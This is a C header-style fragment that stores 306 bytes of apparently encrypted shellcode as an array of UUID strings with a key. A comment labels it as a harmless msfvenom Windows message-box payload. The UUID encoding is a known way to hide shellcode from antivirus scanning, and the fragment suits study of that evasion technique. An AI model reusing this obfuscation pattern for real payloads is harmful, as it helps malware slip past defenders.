#define PAYLOAD_SIZE 306

//msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello
unsigned char key[] =
"\x49\x53\x48\xe2\xdd\xca\x96\x1e\xde\x52\x1f\x2c\xe9\x6b\x63\x82";
BYTE uuids[][37] =
{
        "65bc99f8-4092-3b06-36ee-4d1cb9c9c5bb",
        "d2fa8cb9-6fa7-ed09-a653-26e4a0b22d7f",
        "f30575ac-d7c6-14b1-1910-b9fc73c7b294",
        "59d0e1ac-8e07-2fd4-95ec-20db7d9a8ce6",
        "22e105e8-02a4-8a4b-6953-032bc87a361e",
        "a5c7658f-6343-67d9-2138-ca907b26f278",
        "410c6d7e-e6b1-3401-cfa4-dcd1759cba6d",
        "72253707-1e22-a2be-ea6b-eb3a06027c2c",
        "bf305109-8b42-51fc-0e55-4958f0ed59ad",
        "0af489f7-d367-9689-31a6-99c85c50bba8",
        "baa1c41e-d9a5-0ac2-a260-296b1c5cfc13",
        "cd5da50c-ac55-b33e-1eae-b51ecf6bd737",
        "b5bea59e-e311-47cc-e970-cd7b71b84896",
        "577630f2-616d-0531-2059-af4d9eb7ec38",
        "e1b3540b-9f90-633d-d3f2-c63bcfa0f045",
        "82f04804-41b1-3eb2-0529-9e0b0db37046",
        "a324afd3-727d-a682-f8cc-56460e6fc3a2",
        "08083c3b-39c2-ffc4-29bb-9ee84c12dd43",
        "e6e00ae3-bb37-ad59-2ccc-b1fa6c1b7237",
        "9090df9f-9090-9090-9090-909090909090"
};